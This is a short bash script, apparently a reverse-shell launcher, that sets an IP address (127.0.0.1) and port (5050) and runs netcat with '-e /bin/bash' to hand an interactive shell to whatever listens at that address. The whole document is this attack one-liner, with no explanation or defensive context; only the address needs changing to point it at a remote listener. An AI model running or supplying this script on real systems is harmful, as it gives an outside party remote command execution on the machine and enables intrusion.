#!/bin/bash
port="5050"
ip="127.0.0.1"

nc -v "$ip" "$port" -e /bin/bash   
